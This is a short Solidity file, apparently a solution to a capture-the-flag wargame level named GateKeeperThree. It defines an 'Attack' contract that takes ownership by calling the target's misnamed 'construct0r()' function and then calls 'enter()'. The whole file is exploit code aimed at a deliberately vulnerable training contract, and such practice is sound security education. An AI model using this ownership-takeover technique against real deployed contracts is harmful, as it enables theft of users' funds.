// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface GateKeeperThree{
    function construct0r() external ;
    function enter() external ;
}

contract Attack {
    GateKeeperThree public target;

    constructor(address victim){
        target = GateKeeperThree(victim);
    }

    function beOwner() external{
        target.construct0r();
    }

    function attack() external{
        target.enter();
    }
}